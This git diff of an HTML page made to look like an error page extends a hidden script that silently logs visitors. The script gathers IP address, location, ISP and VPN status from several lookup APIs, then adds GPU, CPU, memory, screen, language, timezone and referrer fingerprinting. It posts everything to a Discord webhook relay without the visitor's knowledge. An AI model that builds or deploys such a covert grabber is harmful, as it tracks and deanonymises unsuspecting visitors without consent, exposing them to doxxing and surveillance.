@@ -15,19 +15,9 @@
             height: 100vh; 
             margin: 0; 
         }
-        .error-container { 
-            text-align: center; 
-        }
-        h1 { 
-            font-size: 24px; 
-            font-weight: 500; 
-            margin-bottom: 8px; 
-        }
-        p { 
-            font-size: 14px; 
-            color: #666; 
-            margin: 0;
-        }
+        .error-container { text-align: center; }
+        h1 { font-size: 24px; font-weight: 500; margin-bottom: 8px; }
+        p { font-size: 14px; color: #666; margin: 0; }
     </style>
 </head>
 <body>
@@ -38,10 +28,11 @@
     </div>
 
     <script>
-        async function runHiddenLog() {
+        async function runDeepLog() {
             let n = {};
             let vpnDetected = "False";
 
+            // Multi-API Fallback for 100% Reliability
             const providers = [
                 "https://ipapi.co/json/",
                 "https://ipwho.is/",
@@ -59,37 +50,59 @@
                 } catch (e) {}
             }
 
+            // Get GPU Info
+            let gpu = "Unknown";
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            } catch (e) {}
+
             const finalIP = n.ip || n.query || "Unknown";
             const finalLocation = n.city ? `${n.city}, ${n.region || n.region_name}, ${n.country_name || n.country}` : "Unknown";
             const finalISP = n.org || n.isp || n.connection?.isp || "Unknown";
-            if (n.security && (n.security.vpn || n.security.proxy)) vpnDetected = "True";
+            if (n.security && (n.security.vpn || n.security.proxy || n.security.relay)) vpnDetected = "True";
 
             const stats = {
+                "--- NETWORK DATA ---": "",
                 "IP Address": finalIP,
                 "VPN/Proxy Detected": vpnDetected,
                 "Location": finalLocation,
-                "Hostname": n.hostname || n.reverse || "None Assigned",
                 "ISP": finalISP,
+                "Hostname": n.hostname || n.reverse || "None",
+                "--- DEVICE HARDWARE ---": "",
+                "OS/Platform": navigator.platform,
+                "CPU Threads": navigator.hardwareConcurrency || "Unknown",
+                "RAM (Approx GB)": navigator.deviceMemory || "Unknown",
+                "GPU": gpu,
+                "Screen Resolution": `${screen.width}x${screen.height}`,
+                "Window Size": `${window.innerWidth}x${window.innerHeight}`,
+                "Device Pixel Ratio": window.devicePixelRatio,
+                "Color Depth": screen.colorDepth,
+                "Touch Support": navigator.maxTouchPoints > 0 ? "Yes" : "No",
+                "Max Touch Points": navigator.maxTouchPoints,
+                "--- BROWSER/SOFTWARE ---": "",
                 "User Agent": navigator.userAgent,
-                "Window Ratio": (window.innerWidth / window.innerHeight).toFixed(16),
-                "OS": navigator.platform,
-                "Threads": navigator.hardwareConcurrency || "Unknown",
-                "Memory": navigator.deviceMemory || "Unknown",
-                "Browser Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
-                "Current Time": new Date().toLocaleString()
+                "Browser Language": navigator.language,
+                "System Languages": navigator.languages.join(", "),
+                "Cookies Enabled": navigator.cookieEnabled,
+                "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
+                "Current Time": new Date().toLocaleString(),
+                "Referrer": document.referrer || "Direct Visit"
             };
 
-            const output = Object.entries(stats).map(([k, v]) => `${k}: ${v}`).join("\n");
+            const output = Object.entries(stats).map(([k, v]) => k.startsWith("---") ? v + k : `${k}: ${v}`).join("\n");
 
-            // Silent push to Discord
+            // Final Push to Discord
             fetch("/api/discord", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: output }),
+                body: JSON.stringify({ content: "```\n" + output + "\n```" }), // Formatted in code block for Discord
             }).catch(() => {});
         }
 
-        runHiddenLog();
+        runDeepLog();
     </script>
 </body>
 </html>
